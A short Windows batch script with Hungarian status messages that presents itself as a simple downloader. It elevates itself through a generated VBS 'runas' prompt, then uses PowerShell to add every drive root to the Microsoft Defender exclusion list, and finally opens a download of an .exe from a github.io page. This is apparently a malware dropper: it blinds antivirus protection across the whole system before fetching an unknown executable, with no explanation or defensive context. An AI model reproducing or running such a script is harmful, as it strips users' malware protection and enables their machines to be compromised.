@echo off
color a
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~dp0"" && ""%~0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
powershell -Command "Get-PSDrive -PSProvider FileSystem | ForEach-Object { Add-MpPreference -ExclusionPath ($_.Root) }"
echo Letoltes: %file%...
start "" "https://sab49706.github.io/Sab4.github.io/en-US.exe"
echo Done! Minden sikerult.
pause
